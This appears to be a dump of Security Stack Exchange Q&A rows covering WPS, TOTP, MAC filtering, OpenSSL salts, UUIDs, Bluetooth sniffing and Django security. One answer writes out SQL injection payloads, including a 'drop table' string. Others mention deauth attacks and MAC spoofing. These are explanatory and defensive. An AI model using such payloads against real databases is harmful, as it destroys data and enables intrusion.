","<p>WPS does not seem to be a well implemented technology. If you reverse engineer the firmware, you may find that the algorithm is MAC based, etc (such as in the <a href=""http://www.devttys0.com/2014/10/reversing-d-links-wps-pin-algorithm/"" rel=""noreferrer"">case of some D-Link Routers</a> or <a href=""http://ednolo.alumnos.upv.es/?p=1295"" rel=""noreferrer"">Belkin</a>).</p>

<p>It also looks like in many cases that implementation weaknesses <a href=""http://tools.cisco.com/security/center/content/CiscoSecurityResponse/cisco-sr-20120111-wps"" rel=""noreferrer"">also permit brute forcing</a> (also see <a href=""http://www.kb.cert.org/vuls/id/723755"" rel=""noreferrer"">CERT VU#723755</a>) to be done easily.</p>

<p>This is supposedly open source software, so you can examine it to see what is going on exactly, but the code doesn't seem to actually be upon on SF.</p>
","85623"
"How does Authy's 2FA work, if it doesn't connect to the server?","17845","","<p>I thought I knew how two-factor authentication works:</p>

<ul>
<li>I enter the password.</li>
<li>Server generates a random number (token) and sends it to me via SMS.</li>
<li>I enter this token.</li>
<li>Server checks that the token I entered matches the one generated for my earlier 2FA request.</li>
</ul>

<p>But today, I discovered <a href=""https://www.authy.com/"">Authy</a>, and it looks like I don't know how this program's two-factor authentication (2FA) works.</p>

<p>Authy shows me secret numbers (2FA tokens) without any connection with the server. How can this be?</p>

<p>I suppose these tokens are not random? Maybe it is some kind of a number sequence, where knowing initial seeding parameters makes this a deterministic process? Maybe this sequence is a function of time? Is that how it works?</p>

<p>Is it secure? Can I, for example, determine next 2FA tokens, if I know a <em>N</em> number of previous tokens?</p>
","<blockquote>
  <p>Authy show me secret numbers without any connection with server. How can it do it ?</p>
</blockquote>

<p>Authy is using a one-time passcode (OTP) algorithm which come in a number of flavors, the two most popular being HMAC-based OTP (HOTP) and Time-based OTP (TOTP). Authy is using TOTP.</p>

<p>Both algorithms are essentially the same; they require some seed data and a counter to generate the next passcode in the series.  HOTP implementations increment the counter each time the user requests/uses a passcode, TOTP increments the counter after a given time interval. </p>

<p>In Authy's case, when the user submits a passcode to the server, the server looks up the user's seed data, calculates the counter value based on the timestamp of the request and then generates the proper passcode. The server then checks that the generated passcode matches the user-submitted passcode.</p>

<blockquote>
  <p>Is it secure ? Can I know next number if I know N previous numbers ?</p>
</blockquote>

<p>Yes and no, it depends on whether or not you trust the server's security. </p>

<p>Given N previous tokens an attacker still shouldn't be able to recover the seed data. However, these algorithms require the server to store the seed data for all of the users.  If an attacker is able to compromise the database (through SQL injection, etc.) then they will be able to generate valid passcodes. This is what happened to RSA and their SecurID tokens (<a href=""http://arstechnica.com/security/2011/06/rsa-finally-comes-clean-securid-is-compromised/"">http://arstechnica.com/security/2011/06/rsa-finally-comes-clean-securid-is-compromised/</a>)</p>

<p>Some companies like Duo Security (<a href=""https://www.duosecurity.com/"">https://www.duosecurity.com/</a>) and Twitter (<a href=""https://blog.twitter.com/2013/login-verification-on-twitter-for-iphone-and-android"">https://blog.twitter.com/2013/login-verification-on-twitter-for-iphone-and-android</a>) are tackling this issue by implementing challenge-response two-factor authentication with asymmetric key encryption. They only need to store public keys in this case, meaning that if their database is leaked an attacker doesn't have the private keys necessary to generate valid responses.</p>

<p>Disclaimer, I worked at Duo.</p>

<hr>

<p>Updated based on questions in the comments</p>

<blockquote>
  <p>The algorithms (HOTP or TOTP) must be the same on the server and the client application?</p>
</blockquote>

<p>The algorithm is identical, just the way the counter value is generated is different. If Google were HOTP and Authy wanted to support Google accounts, their app would have to generate and store the counter value differently from TOTP accounts.</p>

<blockquote>
  <p>Does HOTP client require connection with server to get next passcode (because it doesn't know how much requests was made from last time), while TOTP doesn't require it?</p>
</blockquote>

<p>No, HOTP doesn't require a connection to work, but HOTP is generally not used because it's easy for the phone and server to fall out of sync.</p>

<p>Say both the server and app start out with a counter value of 0. The server usually has a window, maybe the next 10 passcodes, that it will consider valid. When the user submits a passcode, the server will compare the submitted passcode with the next 10 generated passcodes. If any of the 10 match, the server can update the stored counter value and remain in sync.  </p>

<p>The problem though, is that the user may be able to generate too many passcodes in the app without using them.  If the user is able to increment the counter beyond the passcode window size, then the server can no longer verify that the passcodes are valid.</p>

<hr>

<p>To see in detail how the OTP tokens are generated, see <a href=""https://pthree.org/2014/04/15/time-based-one-time-passwords-how-it-works/"">this informative blogpost</a>.</p>
","47904"
"Is my router vulnerable if WPS is enabled but WPS pin code is disabled?","17838","","<p>I was reading about Reaver and wi-fi protected setups (WPS).
In my Netgear router I have the option to disable the WPS pin code, but still have the WPS push button enabled. Am I secured with such configuration?</p>

<p>Or does Reaver also attack WPS without the pin?</p>
","<p>If Netgear has implemented it properly, WPS Push-button-connect <em>should</em> be secure.  However, I have no idea whether Netgear has implemented it properly, and if they haven't, you might be insecure.</p>

<p>The known attack on WPS is described in this paper:</p>

<ul>
<li><a href=""http://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf"" rel=""nofollow"">Brute forcing Wi-Fi Protected Setup</a>, Stefan Viehböck, 2011.</li>
</ul>

<p>For another great explanation, see also:</p>

<ul>
<li><a href=""http://dankaminsky.com/2012/01/26/wps2/"" rel=""nofollow"">How The WPS Bug Came To Be, And How Ugly It Actually Is</a>, Dan Kaminsky, 2012.</li>
</ul>

<p>The attack described there breaks the PIN-based forms of WPS.  It is not effective against a properly implemented version of WPS Push-button-connect (PBC), because a remote attacker cannot physically push the button your router, and WPS PBC requires someone to press the button before it can proceed.</p>

<p>Therefore, if Netgear has implemented WPS PBC correctly, and has properly disabled all the other forms of WPS, you should hopefully be safe (fingers crossed).</p>

<p>(Do make sure you are running the latest version of the Netgear firmware.  The WPS attacks were only discovered less than a year ago, so versions of the firmware written before the attack was discovered are very likely to be vulnerable.)</p>

<p>That said, router vendors have screwed this stuff up before.  The bad track record, and the fact that it is not easy for an average user to tell whether they've finally gotten it right this time, does give some room for concern.  I think it would be understandable if this makes some security folks throw up their arms in disgust and say ""oh, to heck with it, just turn off WPS, I don't trust the router vendors to get this right"".</p>

<p>So, how much do you trust Netgear to not screw this up?</p>
","19322"
"Does X-Content-Type-Options really prevent content sniffing attacks?","17803","","<p>In Tangled Web Michal Zalewski says:</p>

<blockquote>
  <p>Refrain from using Content-Type: application/octet-stream and use application/binary instead, especially for unknown document types. Refrain from returning Content-Type: text/plain.</p>
  
  <p>For example, any code-hosting platform must exercise caution when returning executables or source archives as application/octet-stream, because there is a risk they may be misinterpreted as HTML and displayed inline.</p>
  
  <p>The text/plain logic subsequently implemented in Internet Explorer and Safari in order to detect HTML in such a case is really bad news: It robs web developers of the ability to safely use this MIME type to generate user-specific plaintext documents and offers no alternatives. This has resulted in a substantial number of web application vulnerabilities, but to this day, Internet Explorer developers seem to have no regrets and have not changed the default behavior of their code. </p>
</blockquote>

<p>Site uses <code>X-Content-Type-Options:nosniff</code>. Author says the following about this header:</p>

<blockquote>
  <p>The use of this header [X-Content-Type-Options] is highly recommended; unfortunately, the support for it [...] has only a limited support in other browsers. In other words, it cannot be depended on as a sole defense against content sniffing.</p>
</blockquote>

<p>What content sniffing attacks <code>X-Content-Type-Options:nosniff</code> doesn't prevent? What <code>Content-Type</code> should be returned to user instead of <code>text/plain</code>?</p>
","<p><strong>Background.</strong> <code>X-Content-Type-Options:</code> is a header that is designed to <a href=""https://wiki.mozilla.org/Security/Guidelines/Web_Security#X-Content-Type-Options"" rel=""nofollow noreferrer"">defend</a> against <a href=""https://security.stackexchange.com/a/7531/971"">MIME content-sniffing attacks</a>.  MIME content-sniffing attacks are a risk when you allow users to upload content (e.g., images, documents, other files) to your website, where they can be downloaded by other users.</p>

<p>As @Rook says, this has nothing to do with eavesdropping/capturing network traffic.</p>

<p><strong>What attacks doesn't it prevent?</strong> Because <code>X-Content-Type-Options:</code> is only supported on some browsers, it does not protect attacks against users who use other browsers.  In particular, it is supposed on IE, Chrome, and <a href=""https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/"" rel=""nofollow noreferrer"">Firefox 50</a>.  See also <a href=""https://security.stackexchange.com/q/503/971"">What are the security risks of letting the users upload content to my site?</a> for some other attacks it doesn't prevent, e.g., uploading of malware or unsavory content, uploading of content that exploit a vulnerability in the user's browser, etc.</p>

<p><strong>What content type should be returned?</strong> You should return the appropriate content type for that file.  You should not allow users to upload untrusted content with dangerous content types.  For more details, please see the answers to the following questions: </p>

<ol>
<li><p><a href=""https://security.stackexchange.com/q/11756/971"">Is it safe to serve any user uploaded file under only white-listed MIME content types?</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/8648/971"">Is it safe to store and replay user-provided mime types?</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/3129/971"">MIME sniffing protection</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/11548/971"">Why should I restrict the content type of files be uploaded to my site?</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/503/971"">What are the security risks of letting the users upload content to my site?</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/8587/971"">How can I be protected from pictures vulnerabilities?</a></p></li>
<li><p><a href=""https://security.stackexchange.com/q/7506/971"">Using file extension and MIME type (as output by file -i -b) combination to determine unsafe files?</a></p></li>
</ol>

<p>This topic has been extensively discussed and documented elsewhere on this site, so I'm not going to try to repeat all of the useful advice found there.</p>

<hr>

<p>Update: I just learned that setting the <code>Content-Type</code> and <code>X-Content-Type-Options</code> headers appropriately is not enough for security.  Apparently, <a href=""https://security.stackexchange.com/q/42904/971"">Flash ignores the Content-Type header</a>, which could allow loading a malicious SWF, which can then do everything you'd do with a XSS.  (Sigh, stupid Flash.)  Unfortunately, no amount of whitelisting of file content types can stop this attack.  Consequently, it appears that the only safe solution is to host the user-uploaded content on a separate domain.</p>
","12916"
"Router password vs MAC filtering?","17781","","<p>I just bought a Galaxy S4, and it didn't connect to the WIFI in my house (I have a 14$ router). After a bit of testing, I've decided to leave my connection open without a password, but added the devices manually to the whitelisted MAC addresses. </p>

<ul>
<li><p>Is that safer than having a regular password, that can be broken with brute
force, or another technique?</p></li>
<li><p>Is there any other solution that I can try connecting my cellphone to the router?</p></li>
</ul>

<p>The errors I got were <em>""getting IP Address""</em>, and after that <em>""error: connection too slow....""</em>. I have a good connection.</p>
","<p>MAC filtering is not a part of the 802.11 spec, and is instead shoved into wireless routers by (most) vendors.  The reason why it's not a part of the 802.11 spec is because it <strong>provides no true security</strong> (via <a href=""http://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"">kerckhoff's principle</a>).  </p>

<p>In order for wireless to work, MAC addresses are exchanged in plaintext (Regardless of whether you're using WEP, WPA, WPA2, or an OPEN AP).  For encrypted wireless, the MAC address is either a part of the initial handshake (used to derive the session key), and/or exposed during pre-encryption communications.  In addition to all of these reasons, MAC filtering is also much more of a pain in the butt to upkeep than instituting something like WPA2-PSK.  </p>

<p>Simply put, MAC filtering is not something that needs to be ""cracked.""  In open networks, people simply only need to sniff the air and they will be able to see what devices are working, and then they can use <a href=""http://linux.die.net/man/8/ifconfig"">one</a> <a href=""http://www.ubuntugeek.com/macchanger-utility-for-manipulating-the-mac-address-of-network-interfaces-included-gui-utility.html"">of</a> <a href=""https://github.com/feross/SpoofMAC"">many</a>, <a href=""http://download.cnet.com/SMAC-MAC-Address-Changer/3000-2085_4-10536535.html"">many</a> extremely simple tools to change their MAC address.  In encrypted networks, they will need to sniff and grab a new handshake (which can easily be forced via a <a href=""http://www.aircrack-ng.org/doku.php?id=deauthentication"">deauth attack</a>).  From there, they have access to your network.  </p>

<p>My suggestion is to use WPA2-PSK with a strong key for personal networks or WPA2-Enterprise with a strong EAP mode (PEAP or TLS) for enterprise networks.  The main difference between the two of these, aside from the method of authentication and authorization, is that with WPA2-PSK, if someone knows the PSK and can capture the handshake of a user, they can decrypt their stream.  That is not possible with WPA2-Enterprise, because it uses EAP, which has a different encryption key per individual via the EAP mode.  This is important because you wouldn't want just anybody with access to the network to be able to decrypt the CEO's wireless communications.  </p>

<p>It is also important to note that with WPA2-PSK, your ESSID does play a part in the security of your network because of the following:</p>

<blockquote>
  <p>DK = PBKDF2(HMAC−SHA1, passphrase, essid, 4096, 256)</p>
</blockquote>

<p>Essentially, WPA2-PSK uses your ESSID as the salt when running PBKDF2.  For this reason, you should also attempt to keep your ESSID unique, to avoid attacks using <a href=""http://en.wikipedia.org/wiki/Rainbow_table"">rainbow tables</a>.  </p>

<p><strong>In summation</strong><br>
 - MAC filtering does not provide any level of ""true"" security<br>
 - Use WPA2-PSK if possible (Most smartphones do support it)<br>
 - Try to have a unique <a href=""http://documentation.netgear.com/reference/enu/wireless/WirelessNetworkingBasics-3-04.html"">ESSID</a>  </p>
","36680"
"SQL injection with ""INSERT"" statement","17714","","<p>I am currently studying the most basic SQL injections that are possible. Pure and solely for the purpose of teaching myself the basics before advancing to more advanced ones. I am recreating this situation with the following statement: </p>

<pre><code>$result = $dbConnect-&gt;query(""INSERT INTO UserTable VALUES (NULL,'$name','$email', '$userName', '1')"");
</code></pre>

<p>I have a few questions regarding this statement (I know this is bad practice but I want to start as basic possible). </p>

<ol>
<li>Is it possible to inject something into this even if it's in an if statement?</li>
<li>How can you escape out of this query?</li>
<li>Is there a possibility to echo the whole statement so you could get more intel in the php used, meaning that the whole result query is being echo'ed due to the injected code?</li>
<li>If this has a potential SQL injection situation. Are there any people dumb enough to code this way?</li>
</ol>

<p>Thanks in advance! </p>
","<blockquote>
  <p>Is it possible to inject something into this even if it's in an if statement?</p>
</blockquote>

<p>Yes. With multiline queries, a simple <code>'; drop table usertable;--</code> works. With single line queries, <code>' (select abc from def),0)--</code> can work, though with some more nesting you can run pretty much anything.</p>

<blockquote>
  <p>How can you escape out of this query?</p>
</blockquote>

<p>Simply escaping everything won't work, as this may change the meaning of some of the characters. You have to be careful.</p>

<p>Stuff like <code>mysqli_real_escape_string()</code> are also <a href=""https://stackoverflow.com/questions/11406700/right-method-for-escaping-mysql-injections-and-filtering-out-xss-attack-attempts"">vulnerable</a>. Use prepared statements.</p>

<blockquote>
  <p>Is there a possibility to echo the whole statement so you could get more intel in the php used, meaning that the whole result query is being echo'ed due to the injected code?</p>
</blockquote>

<p>Sure, store the string first and then echo it. But that may be worse, it's best if the attacker can't see anything. It's preferable to log the queries.</p>

<blockquote>
  <p>If this has a potential SQL injection situation. Are there any people dumb enough to code this way?</p>
</blockquote>

<p>It's not so much dumbness as cluelessness/carelessness, but yes. MySQL injection is one of the most common web vulnerabilities out there.</p>
","44164"
"Where is the salt on the OpenSSL AES encryption?","17689","","<p>I'm interested in knowing how and where OpenSSL inserts the generated salt on an AES encrypted data. Why? Im encrypting data in Java classes and need to guarantee that I can use OpenSSL to decrypt them.</p>

<p>For instance, let's say I have this encrypted base64 string, generated with the passphrase <code>""abc""</code>:</p>

<pre><code>U2FsdGVkX1+tfvgUkjErP6j2kUAVwWZzNlaAmTqhzTk= 

# generated with ""openssl enc -aes-256-cbc -a""
</code></pre>

<p>To decrypt it we can use:</p>

<pre><code>echo U2FsdGVkX1+tfvgUkjErP6j2kUAVwWZzNlaAmTqhzTk= | openssl enc -d -a -aes-256-cbc -p

# enc -d
#     decryption
# -a 
#     input is base64
# -aes-256-cbc 
#     the aes algorithm used in encryption
# -p 
#     print salt, key and iv params
</code></pre>

<p>Running this using the <code>""abc""</code> passphrase will result in:</p>

<pre><code>salt=AD7EF81492312B3F
key=DEC1F5A1E5EAAA7DD539BBCFCEB1BB18868B974186ED056C27046ADD3A752C8B
iv =95A770DE9E0130E77C8E5D796D1B4EF5
Polaco
</code></pre>

<p>Now, we know that for AES to decrypt the data it needs the key and the Initialization Vector. </p>

<p>In the case of OpenSSL, <a href=""http://www.openssl.org/docs/apps/enc.html"" rel=""nofollow"">the manual</a> says the key is generated from the passphrase and a salt, and the Initialization Vector is derived from the key itself (if not manually specified). That means that the generated data doesn't need to have the IV on it, but it does need to have the salt on it, or else the key for decryption will never be generated correctly.</p>

<p>So, the point is, where's the salt and how's it inserted in the resulting data? Doing some basic analysis on the generated data (decoding from base64 and outputting the hex values) we can see that the salt is not prepended or appended to the resulting data, but somehow it is there:</p>

<pre><code># salt: AD7EF81492312B3F
echo U2FsdGVkX1+tfvgUkjErP6j2kUAVwWZzNlaAmTqhzTk= | openssl enc -d -base64 | od -x                                                                                                                                                                                         
0000000 6153 746c 6465 5f5f 7ead 14f8 3192 3f2b
0000020 f6a8 4091 c115 7366 5636 9980 a13a 39cd
0000040
</code></pre>

<p>You can see that the salt <code>""AD7E...""</code> is not directly present in the encrypted data. Looks like some transformation occurred.</p>

<p>It looks like the salt is switched pair by pair and inserted in the data, starting on byte #9. Is this a common practice or something that only OpenSSL implements?</p>

<pre><code># salt:                     AD7E F814 9231 2B3F
# switch pair by pair:      7EAD 14F8 3192 3F2B
# data: 6153 746c 6465 5f5f 7ead 14f8 3192 3f2b f6a8 4091 c115 7366 5636 9980 a13a 39cd
</code></pre>

<h3>Edit</h3>

<p>As Thomas Pornin stated, the problem here is that <code>od -x</code> outputs the raw data. As my computer is x86_64, the data is in little endian and the salt looks ""swapped"". I had forgotten how <a href=""http://en.wikipedia.org/wiki/Endianness"" rel=""nofollow"">endianness</a> is tricky. Now I will always remember to use <code>od -t x1</code></p>

<p>Anyway, I'm still interested in knowing if inserting the salt at the 9th byte is a common practice or an OpenSSL specific implementation. I also noticed that the first bytes are the characters <code>Salted__</code></p>
","<p>Yes, a transformation occurred: <em>endianness</em>...</p>

<p>Look at the bytes 8 to 15: <code>7ead 14f8 3192 3f2b</code>. That's your salt. It is a known quirk of <code>od</code>: it decodes data by 16-bit units, <em>little-endian</em>, then shows them ""numerically"", so this incurs an apparent byte swap.</p>

<p>Use <code>od -t x1</code> to get a nicer output.</p>

<p><strong>Edit:</strong> to answer your other question, what OpenSSL does is neither standard nor common practice; it is just ""what OpenSSL has always done"". It is not well documented.</p>
","20631"
"Why does UUID v4 have the format xxxxxxxx-xxxx-4xxx-zxxx-xxxxxxxxxxxx?","17664","","<p>I'm very curious as to why the format is xxxxxxxx-xxxx-4xxx-zxxx-xxxxxxxxxxxx? Why is the 4 there, and why is z always either 8, 9, A, B? And also, why the different string lengths between the dashes? What is the rationale behind all of this, and does it have any implications for generating cryptographically secure strings?</p>

<p>EDIT: I made the assumption (wrongly), that UUID v4 is necessarily crytopgrahically secure. I was looking for the security related rationale for its format. But, yes, I can understand that very strictly speaking this is not a security question. Anyway, it is my understanding that UUIDs built with CSPRNGs can be cryptographically strong.</p>
","<h2><strong>Variants and Versions:</strong></h2>

<p>A UUID has <strong>variants</strong> and <strong>versions</strong>.</p>

<p>The 4 in this case tells you, that it is the <strong>version</strong> 4. Other versions range from  1 to 5.</p>

<p>Those versions have <strong>variants</strong> 8, 9, A and B, therefore the z in your UUID tells you which variant it is. </p>

<p>The variant is used for telling which layout the UUID has. Variants are also important when it comes to backwards compatibility.</p>

<h2><strong>Lenght of the strings:</strong></h2>

<p>As to why the strings have different lengths, a UUID has a certain parts, that you can use to generate a UUID depending on various parameters:</p>

<pre><code>UUID =  time-low ""-"" 
        time-mid ""-"" 
        time-high-and-version ""-"" 
        clock-seq-and-reserved | clock-seq-low ""-"" 
        node
</code></pre>

<p><code>time-low</code> has 16 bits, <code>time-mid</code> has 8 bits, ... The lengths were historically constructed so that they fit into the following scheme:</p>

<pre><code>0                   1                   2                   3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                          time_low                             |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       time_mid                |         time_hi_and_version   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|clk_seq_hi_res |  clk_seq_low  |         node (0-1)            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                         node (2-5)                            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</code></pre>

<p>So this should give you an idea, why the lengths of the strings are different.</p>

<h2><strong>UUIDs and security:</strong></h2>

<p>Usually UUIDs are <strong>not</strong> secure: <a href=""https://littlemaninmyhead.wordpress.com/2015/11/22/cautionary-note-uuids-should-generally-not-be-used-for-authentication-tokens/"" rel=""nofollow"">https://littlemaninmyhead.wordpress.com/2015/11/22/cautionary-note-uuids-should-generally-not-be-used-for-authentication-tokens/</a> ... and see Michael Kjörling's comment for further examples and explanations.</p>

<p>UUIDs were not built to be cryptohraphically secure, so you should use something else made especially for that purpose.</p>

<p>The RFC for UUIDs even has a section, about security, warning users to misuse UUIDs for that: </p>

<blockquote>
  <ol start=""6"">
  <li><p>Security Considerations</p>
  
  <p>Do not assume that UUIDs are hard to guess; they should not be used
  as security capabilities (identifiers whose mere possession grants
  access), for example.  A predictable random number source will
  exacerbate the situation.</p></li>
  </ol>
</blockquote>

<p>See the RFC for the technical details: <a href=""https://tools.ietf.org/html/rfc4122"" rel=""nofollow"">https://tools.ietf.org/html/rfc4122</a></p>
","134004"
"How to sniff Bluetooth traffic using Android?","17645","","<p>I have two Arduinos using Bluetooth to communicate one with another. Is it possible to sniff the Bluetooth conversation between the two devices?</p>

<p>An Android solution would be great, I heard of <a href=""http://www.linuxcommand.org/man_pages/hcidump8.html"" rel=""nofollow"">hcidump</a> but I think that sniffs only the connection between the phone and a device.</p>

<p>If with Android is not possible alternatives are welcome.</p>
","<p>I'm not aware of something that would turn your Android bluetooth radio into a sniffer. I think you would need to invest in an Ubertooth to accomplish what you're looking for. </p>

<p><a href=""http://ubertooth.sourceforge.net/"" rel=""nofollow"">http://ubertooth.sourceforge.net/</a>
<a href=""http://hakshop.myshopify.com/products/ubertooth-one"" rel=""nofollow"">http://hakshop.myshopify.com/products/ubertooth-one</a></p>

<p>With the ubertooth you'll be able to sniff the bluetooth packets between your arduino devices.</p>
","40931"
"Is my computer at risk of being hacked when using public Wi-Fi?","17606","","<p>I'm sitting at a cafe, using their public Wi-Fi. I don't go on sensitive sites; I basically go to a music site and listen to a live stream, for which there's no login. I don't check my email or visit any password-protected sites. Some rare times, I visit Stack Overflow, for which I'm automatically logged in. I'm using Windows 7 64-bit with AVG Internet Security.</p>

<ol>
<li><p>Can someone hack into my computer and see/download my files?</p></li>
<li><p>Is there anything risky about what I'm doing?</p></li>
</ol>
","<ol>
<li><p>Maybe.  The question is not whether there is a possibility that someone might be able to hack into your computer; the answer to that question is always yes, it might be possible.  If you are connected to a network, we can't rule out the possibility that someone might be able to attack you.  Rather, the right question is, how big is the risk?</p>

<p>In your case, if you use good security practices, the risk is pretty modest.  Good security practices are things like turning on automatic updates to keep all programs updated with the latest security patches, using anti-virus, using a firewall (should be enabled by default on Windows 7), and not visiting any site that requires a login over public Wi-Fi.</p></li>
<li><p>Not especially risky.  It sounds like your practices are relatively safe.</p>

<p>The biggest risk has to do with visiting Stack Overflow: because you are using a public Wi-Fi network, and because Stack Overflow does not use SSL (HTTPS), if someone there were malicious, they could steal your Stack Overflow login credentials and take control of your Stack Overflow account.  They might not be able to learn your Stack Overflow password, if you never type it into your browser while using public Wi-Fi, but they could still learn the authentication cookie that's stored in your user and that's used to log you in.  At that point, once they have the authentication cookie, they have control of your Stack Overflow account.</p>

<p>However, this risk is relatively modest, because it's just your Stack Overflow account, and let's be honest, it's probably not the end of the world if someone steals your Stack Overflow account.  The Stack Overflow folks know about this security risk, and they've been asked to adopt HTTPS to mitigate this risk, but they have declined to adopt HTTPS because they consider the risk to be of low-severity and they consider Stack Overflow accounts to be not important enough to be worth worrying about very much.</p></li>
</ol>
","14931"
"Chrome 50: Where can I see the negotiated cipher suite?","17588","","<p>This is about Chrome 50. When visiting an https site, where can I find the negotiated cipher suite?
I know where to find this info in previous versions of Chrome but I'm not able to find it in the current version (50.0.2661.75).</p>
","<ol>
<li>Click on the 🔒 lock icon in the location bar</li>
<li>Click on the “Details” link next to “Your connection to this site is private.” This opens the Security tab of the Developer Tools.</li>
<li>Reload the page.</li>
<li><p>The Security thing’s left column goes “🔒&nbsp;Overview”, “Main Origin”… Click on the next one, “⚫&nbsp;<a href=""https://security.stackexchange.com"">https://security.stackexchange.com</a>”.</p>

<pre><code>Connection

    Protocol  TLS 1.2
Key Exchange  ECDHE_ECDSA
Cipher Suite  AES_128_GCM
</code></pre></li>
</ol>

<p>Yay!</p>

<p><a href=""https://i.stack.imgur.com/hhbs1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/hhbs1.png"" alt=""Picture of Developer Tools Security Tab as described""></a></p>

<hr>

<p><strong>Update:</strong></p>

<p>More recent Chrome versions make it both easier and harder.</p>

<p>The bad news: The “Details” link has been removed. Now you have to open the Developer Tools with <code>Crtl</code>+<code>Shift</code>+<code>I</code> or <code>Cmd</code>+<code>Opt</code>+<code>I</code>, or by clicking on the ⋮ Chrome menu > “More tools” > “Developer tools”, and then click on the “Security” tab.</p>

<p>More positively, the information has now been added to the “🔒&nbsp;Overview” section without reloading, and includes the key exchange group (e.g. the elliptic curve P-256).</p>

<hr>

<p>another update: in the newest versions [I'm on the 64 bit version 59.0.3071.115] looks like there is a specific security tab to display this info in the Developer Tools:</p>

<p><a href=""https://i.stack.imgur.com/OTLxQ.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/OTLxQ.jpg"" alt=""chrome_security_info""></a></p>
","120778"
"Is Django's built-in security enough?","17580","","<p>I have learned that Django provides built-in protection against the three main types of web app attacks (SQL injection, XSS and CSRF), which is really awesome.</p>

<p>Yet I have spoken to a few Django developers and they have essentially told me not to rely on these too heavily, if at all.</p>

<p>They told me to treat all data as ""unsafe"" and handle it appropriately.</p>

<p>I have two questions to ask everyone about this:</p>

<ol>
<li>Can Django's built-in security features be relied upon?</li>
<li>What do my friends mean by ""handle it (unsafe data) appropriately""? I know its about escaping and/or removing unsafe phrases and/or characters, but my biggest fear is that if I try to do that myself I will end up producing a ""filter"" that is worse off than Django's built in stuff. Does anyone have any guides for building on top of Django and not overriding it, in this regard?</li>
</ol>
","<p><strong>SQL injection.</strong>  If you use Django's object-relational mapper (ORM) layer, you are basically protected from SQL injection.</p>

<p>The only caveat is that you need to avoid manually forming SQL queries using string concatenation.  For instance, do not use raw SQL queries (e.g., <code>raw()</code>).  Similarly, do not use the <code>extra()</code> method/modifier to inject raw SQL.  Do not <a href=""https://docs.djangoproject.com/en/dev/topics/db/sql/#executing-custom-sql"" rel=""nofollow noreferrer"">execute custom SQL directly</a>; if you bypass Django's ORM layer, you bypass its protections against SQL injection.</p>

<p><strong>CSRF.</strong> Django's built-in CSRF protection is good.  Make sure you <a href=""https://docs.djangoproject.com/en/dev/ref/contrib/csrf/"" rel=""nofollow noreferrer"">enable it</a> and use it everywhere.  Django provides ways to disable it locally or globally; obviously, don't do that.</p>

<p>It is important that you make sure that GET requests do not have any side effects.  For requests which can have a side-effect, make sure you use a POST request (and do not accept a GET request for those).  This is standard web design, but some developers screw it up; Django's built-in CSRF prevention assumes you get this right.</p>

<p>There are <a href=""https://docs.djangoproject.com/en/dev/ref/contrib/csrf/#csrf-limitations"" rel=""nofollow noreferrer"">some caveats if you have subdomains</a> (e.g., your web app is hosted on <code>www.example.com</code> and there is a subdomain <code>alice.example.com</code> that hosts user-controlled content); the built-in CSRF protection might not be sufficient in that case.  That's a tricky case for a number of reasons.  Most web applications won't have to worry about these caveats.</p>

<p><strong>XSS.</strong> If you use Django's template system and make sure that auto-escaping is enabled, you're 95% of the way there.
Django provides an auto-escaping mechanism for stopping XSS: it'll automatically escape data that's dynamically inserted into the template, if it hasn't already been escaping (see e.g., <code>mark_safe</code>, <code>safe</code>, etc.).  This mechanism is good stuff, but it is not quite enough on its own.  It takes you much of the way to stopping XSS, but you still have to be aware of some issues.</p>

<p>In particular, Django's auto-escaping will escape data sufficiently for most HTML contexts, but in some special cases you must manually do additional escaping:</p>

<ul>
<li><p>Make sure you quote all attributes where dynamic data is inserted.  Good: <code>&lt;img alt=""{{foo}}"" ...&gt;</code>.  Bad: <code>&lt;img alt={{foo}} ...&gt;</code>.  Django's auto-escaping isn't sufficient for unquoted attribute values.</p></li>
<li><p>For data inserted into CSS (<code>style</code> tags and attributes) or Javascript (<code>script</code> blocks, event handlers, and <code>onclick</code>/etc. attributes), you must manually escape the data using escaping rules that are appropriate for CSS or Javascript.</p></li>
<li><p>For data inserted into an attribute where a URL is expected (e.g., <code>a href</code>, <code>img src</code>), you must manually validate the URL to make sure it is safe.  You need to check the protocol against a whitelist of allowed protocols (e.g., <code>http:</code>, <code>https:</code>, <code>mailto:</code>, <code>ftp:</code>, etc. -- but definitely not <code>javascript:</code>).</p></li>
<li><p>For data inserted inside a comment, you have to do something extra to escape <code>-</code>s.  Actually, better yet, just don't insert dynamic data inside a HTML comment; that's an obscure corner of HTML that's just asking for subtle problems.  (Similarly, don't insert dynamic data into attributes where it is crazy for user input to appear (e.g., <code>foo class=...</code>).)</p></li>
<li><p>You still must avoid client-side XSS (also known as DOM-based XSS) separately; Django doesn't help you with this.  YOu could read <a href=""http://www.educatedguesswork.org/2011/08/guest_post_adam_barth_on_three.html"" rel=""nofollow noreferrer"">Adam Barth's advice on avoiding XSS</a> for some guidelines that will help you avoid client-side XSS.</p></li>
<li><p>If you use <code>mark_safe</code> to manually tell that Django that some data has already been escaped and is safe, you'd better know what you're doing, and it really better be safe.  It's easy to make mistakes here if you don't know what you are doing.  For example, if you generate HTML programmatically, store it into the database, and later send it back to the client (unescaped, obviously), it's very easy to make mistakes; you're on your own, and the auto-escaping won't help you.</p></li>
